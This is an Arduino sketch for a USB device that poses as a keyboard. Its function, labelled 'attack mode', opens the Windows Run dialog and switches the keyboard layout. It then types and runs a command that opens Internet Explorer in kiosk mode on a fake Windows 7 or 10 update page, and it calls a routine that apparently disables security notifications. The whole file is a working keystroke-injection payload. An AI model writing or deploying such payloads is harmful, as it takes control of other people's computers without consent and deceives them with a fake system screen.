#include <Keyboard.h>
void Fakeupdate(int ver) {
  //attack mode
  delay(2000);
  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.releaseAll();
  delay(400);
  if (ver == 7) {
    Keyboard.print("iexplore -k http://fakeupdate.net/win7/index.html");
    delay(100);
  }
  if (ver == 10) {
    Keyboard.print("iexplore -k http://fakeupdate.net/win10/index.html");
  }
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();
  delay(5000);
  DisableNotifyAboutSecureContent();
  delay(100);
}
